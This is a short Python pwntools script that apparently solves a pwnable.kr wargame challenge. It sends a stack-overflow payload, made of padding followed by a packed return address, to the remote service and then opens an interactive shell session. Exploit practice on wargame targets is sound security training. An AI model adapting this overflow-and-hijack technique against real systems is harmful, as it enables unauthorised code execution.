#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

p = remote("pwnable.kr", 9015)
time.sleep(2)
p.recv()

time.sleep(0.1)

payload = "-1\n" + "a" * 4093 + "b" * 0x38 + p64(0x4005f4) + "\n"

w=open("payload","wb")
w.write(payload)
w.close()

p.send(payload.encode("hex"))
p.interactive()
